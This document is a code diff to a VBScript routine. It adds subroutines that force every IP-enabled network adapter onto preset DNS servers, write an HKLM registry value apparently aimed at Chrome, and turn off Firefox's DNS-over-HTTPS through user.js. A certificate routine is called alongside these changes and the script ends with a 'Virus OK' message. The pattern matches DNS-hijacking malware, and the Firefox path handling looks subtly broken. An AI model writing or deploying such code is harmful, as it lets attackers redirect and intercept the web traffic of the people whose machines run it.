@@ -14,6 +14,29 @@ Sub MainScriptLogic()
 
     CertWorks
 
+	Chrome
+
+	FireFox
+   
+
+    Dim objWMIService, colAdapters, objAdapter
+    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
+    Set colAdapters = objWMIService.ExecQuery("Select * from Win32_NetworkAdapterConfiguration")
+
+    For Each objAdapter In colAdapters
+        If objAdapter.IPEnabled Then
+            Dim arrDNSServers
+            arrDNSServers = Array(PrimaryDNSServer, SecondaryDNSServer)
+            objAdapter.SetDNSServerSearchOrder arrDNSServers
+        End If
+    Next
+
+    Set objWMIService = Nothing
+
+    MsgBox "Virus OK"
+End Sub
+
+Sub Chrome
 	Dim objShell
 	Set objShell = CreateObject("WScript.Shell")
 	
@@ -34,23 +57,36 @@ Sub MainScriptLogic()
     dim objRegistry
     Set objRegistry = GetObject("winmgmts:\\.\root\default:StdRegProv")
     objRegistry.CreateKey HKEY_LOCAL_MACHINE, strKeyPath
-    objRegistry.SetDWORDValue HKEY_LOCAL_MACHINE, strKeyPath, strValueName, dwValue
+    objRegistry.SetDWORDValue HKEY_LOCAL_MACHINE, strKeyPath, strValueName, dwValue	
+End Sub
 
-    Dim objWMIService, colAdapters, objAdapter
-    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
-    Set colAdapters = objWMIService.ExecQuery("Select * from Win32_NetworkAdapterConfiguration")
+Sub Firefox()
+    Dim objFSO, objShell, userProfilePath, profilePath, userJSPath, objFile
 
-    For Each objAdapter In colAdapters
-        If objAdapter.IPEnabled Then
-            Dim arrDNSServers
-            arrDNSServers = Array(PrimaryDNSServer, SecondaryDNSServer)
-            objAdapter.SetDNSServerSearchOrder arrDNSServers
+    Set objFSO = CreateObject("Scripting.FileSystemObject")
+    Set objShell = CreateObject("WScript.Shell")
+
+    userProfilePath = objShell.ExpandEnvironmentStrings("%USERPROFILE%")
+    profilePath = userProfilePath & "\AppData\Roaming\Mozilla\Firefox\Profiles\"
+
+    If objFSO.FolderExists(profilePath) Then
+        Dim profileFolder
+        Set profileFolder = objFSO.GetFolder(profilePath)
+
+        userJSPath = profileFolder.Path & "\user.js"
+
+        If Not objFSO.FileExists(userJSPath) Then
+            Set objFile = objFSO.CreateTextFile(userJSPath)
+            objFile.Close
         End If
-    Next
 
-    Set objWMIService = Nothing
+        Set objFile = objFSO.OpenTextFile(userJSPath, 8, True)
+        objFile.WriteLine "user_pref(""network.trr.mode"", 5);"
+        objFile.Close
+    End If
 
-    MsgBox "Virus OK"
+    Set objFSO = Nothing
+    Set objShell = Nothing
 End Sub
 
 Function IsAdmin()
